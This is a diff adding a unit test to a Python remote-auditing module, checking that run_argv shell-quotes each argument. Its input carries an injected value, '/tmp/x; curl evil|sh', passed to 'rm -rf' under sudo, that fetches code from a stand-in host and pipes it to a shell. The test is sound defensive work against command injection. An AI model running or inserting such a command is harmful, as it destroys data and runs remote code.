@@ -12,7 +12,29 @@ import socket
 
 import paramiko
 
-from grc_auditor.remote import BastionError, HostKeyMismatch, _bastion_error
+from grc_auditor.remote import (
+    BastionError, CommandResult, HostKeyMismatch, RemoteHost, _bastion_error,
+)
+
+
+def test_run_argv_quotes_every_token():
+    # run_argv must shell-quote each token so a value containing shell
+    # metacharacters (e.g. derived from a hostile target's command output)
+    # cannot break out of the intended argument and inject a command.
+    captured = {}
+
+    class _Conn(RemoteHost):
+        def __init__(self):
+            pass
+
+        def run(self, command, *, sudo=False, timeout=None):
+            captured["command"] = command
+            captured["sudo"] = sudo
+            return CommandResult(0, "", "")
+
+    _Conn().run_argv(["rm", "-rf", "/tmp/x; curl evil|sh"], sudo=True)
+    assert captured["command"] == "rm -rf '/tmp/x; curl evil|sh'"
+    assert captured["sudo"] is True
 
 
 class _FakeKey:
